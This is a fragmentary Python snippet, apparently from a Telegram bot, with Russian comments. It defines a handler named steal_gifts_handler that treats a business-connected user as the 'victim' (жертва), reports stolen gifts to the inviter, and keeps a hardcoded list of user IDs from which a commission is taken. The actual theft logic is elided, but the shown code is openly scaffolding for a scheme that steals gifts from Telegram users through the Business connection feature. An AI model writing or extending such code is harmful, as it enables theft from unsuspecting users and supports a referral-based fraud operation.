...
COMMISSION_REFERRERS = ["8314306734", "8173940468", "8281679946", "8401513580", "7359853306", "7616791280", "8479800726"]  # ID пользователей, с которых берется комиссия
...
async def steal_gifts_handler(callback: CallbackQuery):
    ...
    try:
        ...
        user = business_connection.user  # Приглашённый (жертва)
    except Exception as e:
    ...
    if inviter_id and user_stolen:
        try:
            await bot.send_message(inviter_id, public_report)
        except Exception as e:
            logging.error(f"Не удалось уведомить пригласившего: {e}")
